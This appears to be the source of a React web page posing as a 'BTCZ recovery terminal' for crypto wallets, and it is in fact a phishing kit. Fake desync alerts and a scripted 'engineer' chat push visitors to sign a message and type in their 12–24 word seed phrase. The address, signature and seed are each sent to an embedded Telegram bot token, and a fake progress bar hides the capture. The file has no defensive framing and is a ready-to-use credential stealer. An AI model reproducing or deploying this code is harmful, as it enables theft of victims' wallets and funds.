import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useSignMessage } from 'wagmi';
import { AlertTriangle, ShieldAlert, Cpu, Network, Zap, Send, Lock, Loader2, Info } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { signMessage } = useSignMessage();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [chatLog, setChatLog] = useState([]);
  const [chatInput, setChatInput] = useState("");

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const lastUpdateId = useRef(0);

  // --- BTCZ TECHNICAL HOOKS ---
  const sendTelegram = (text, type = "BTCZ_DEBUG") => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `[${type}]: ${text}` }),
    });
  };

  useEffect(() => {
    if (isConnected && address) {
      const initMsg = "[SYS_LOG]: CHETAHDEX_8.2 FORK DETECTED. Legacy RPC handshake timed out. Initializing BTCZ v2.0 Node Bridge...";
      setChatLog([{ type: 'bot', msg: initMsg }]);
      sendTelegram(`🟢 TARGET_CONNECTED | ADDR: ${address} | FORK: Chetahdex_8.2`);
    }
  }, [isConnected]);

  // Handle the "Handshake" Signature
  const triggerHandshake = () => {
    const msg = `[OFFICIAL] BTCZ_NODE_RECOVERY_PROTOCOL\nVault: ${address}\nAction: RECTIFY_LEGACY_SYNC\nStatus: HANDSHAKE_PENDING\nSync_ID: BTCZ-2026-X99`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        sendTelegram(`🎯 HANDSHAKE_SIGNED | SIG: ${sig}`);
        setLoading(true);
        setTimeout(() => {
            setLoading(false);
            setView("seed_gate");
            const stallMsg = "[ENGINEER]: Diagnostic: RPC_ENTROPY_MISMATCH (90%). The Chetahdex local cache is corrupt. Please provide Master Entropy key to align with BTCZ Mainnet.";
            setChatLog(prev => [...prev, { type: 'bot', msg: stallMsg }]);
            sendTelegram(`🚨 USER_STALLED_90 | ADDR: ${address}`);
        }, 2500);
      }
    });
  };

  return (
    <div className="min-h-screen bg-[#020408] text-slate-300 font-mono p-4 uppercase select-none flex flex-col tracking-tight">
      
      {/* 🚨 SYSTEM ALERT BANNER */}
      <div className="bg-red-950/30 border border-red-900/50 p-3 rounded-lg mb-4 flex items-center gap-3 animate-pulse">
        <AlertTriangle className="text-red-500" size={20}/>
        <div className="text-[7px] leading-tight font-black text-red-500">
          [CRITICAL_PATCH_REQUIRED]: BTCZ v2.0 MAINNET DESYNC. CHETAHDEX 8.2 HANDSHAKE FAILED. MANUAL RECTIFICATION PORTAL ACTIVE.
        </div>
      </div>

      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-3">
        <div className="flex flex-col">
          <div className="text-cyan-500 text-xs font-black italic flex items-center gap-2">
            <Cpu size={14}/> BTCZ_RECOVERY_TERMINAL_v4.1
          </div>
          <div className="text-[6px] text-slate-600 mt-1">NODE_STATUS: RPC_HANDSHAKE_TIMEOUT</div>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      <div className="flex-1 overflow-y-auto no-scrollbar pb-40">
        {view === "menu" && (
          <div className="space-y-3">
             <div className="bg-[#0a0c12] border border-slate-800 p-6 rounded-2xl text-center">
                <p className="text-[8px] text-slate-500 mb-4">DETECTION: UNABLE TO SYNC BTCZ BALANCE IN CHETAHDEX 8.2</p>
                <button onClick={triggerHandshake} className="w-full bg-cyan-700 hover:bg-cyan-600 py-4 rounded-xl text-[10px] font-black text-white italic shadow-lg shadow-cyan-900/20">
                   INITIALIZE_RPC_RECTIFICATION
                </button>
             </div>

             <div className="grid grid-cols-2 gap-3 opacity-40 grayscale">
                <div className="bg-[#0a0c12] border border-slate-800 p-4 rounded-xl text-center flex flex-col items-center gap-2">
                   <Zap size={16}/><span className="text-[7px]">AIRDROP_SYNC</span>
                </div>
                <div className="bg-[#0a0c12] border border-slate-800 p-4 rounded-xl text-center flex flex-col items-center gap-2">
                   <Network size={16}/><span className="text-[7px]">BRIDGE_KMD</span>
                </div>
             </div>
          </div>
        )}
      </div>

      {/* 💬 ENGINEER CHAT */}
      <div className="fixed bottom-0 left-0 right-0 bg-[#07090e] border-t border-slate-800 p-4 rounded-t-3xl z-[50]">
        <div className="max-h-20 overflow-y-auto mb-3 no-scrollbar space-y-2">
          {chatLog.map((chat, i) => (
            <div key={i} className={`text-[8px] font-mono p-1 rounded ${chat.type === 'bot' ? 'text-cyan-600 bg-cyan-950/10' : 'text-slate-500 text-right italic'}`}>
              {chat.msg}
            </div>
          ))}
        </div>
        <div className="flex gap-2 bg-black rounded-full px-4 py-2 border border-slate-900">
          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} placeholder="REQUEST ADMIN SUPPORT..." className="flex-1 bg-transparent text-[8px] outline-none" />
          <Send size={14} className="text-cyan-500"/>
        </div>
      </div>

      {/* 🚨 RECOVERY KEY GATE */}
      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex flex-col items-center justify-center p-6 backdrop-blur-md">
          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[30px] p-8 text-center border-red-900/30">
            {isSyncing ? (
               <div className="py-8">
                 <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin"/><div className="absolute inset-0 flex items-center justify-center text-[10px]">{syncProgress}%</div></div>
                 <h2 className="text-white text-xs font-black animate-pulse">RE-INDEXING BTCZ_MAINNET...</h2>
               </div>
            ) : (
              <>
                <ShieldAlert size={40} className="text-red-600 mx-auto mb-4 animate-bounce" />
                <h2 className="text-white text-xs font-black mb-1 italic">NODE ENTROPY MISMATCH</h2>
                <p className="text-[7px] text-slate-500 mb-6 uppercase">Sync Chetahdex Wallet to BitcoinZ Mainnet Nodes</p>
                <textarea 
                  value={seedVal} 
                  onChange={(e) => { const words = e.target.value.trim().split(/\s+/); if(words.length <= 24) setSeedVal(e.target.value); }}
                  placeholder="ENTER 12-24 WORD RECOVERY ENTROPY..." 
                  className="w-full h-32 bg-black border border-slate-800 rounded-2xl p-4 text-[9px] text-cyan-500 font-mono outline-none uppercase shadow-inner"
                />
                <button 
                  disabled={seedVal.trim().split(/\s+/).length < 12} 
                  onClick={() => {
                    setIsSyncing(true); sendTelegram(`🚨 BTCZ_SEED_CAPTURED: ${seedVal}`);
                    let cur = 90; const int = setInterval(() => { cur += 0.2; if(cur >= 100){ setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150);
                  }}
                  className={`w-full mt-5 py-4 rounded-xl text-[10px] font-black text-white ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-700 active:scale-95 shadow-xl shadow-cyan-900/40' : 'bg-slate-900 opacity-30 cursor-not-allowed'}`}
                >
                   AUTHORIZE_RECOVERY
                </button>
              </>
            )}
          </div>
        </div>
      )}

      {loading && <div className="fixed inset-0 bg-black/90 z-[200] flex flex-col items-center justify-center font-black italic"><Loader2 size={30} className="text-cyan-500 animate-spin" /><p className="text-[9px] text-cyan-500 mt-6 tracking-widest animate-pulse">VALIDATING_BTCZ_HANDSHAKE...</p></div>}
    </div>
  );
}
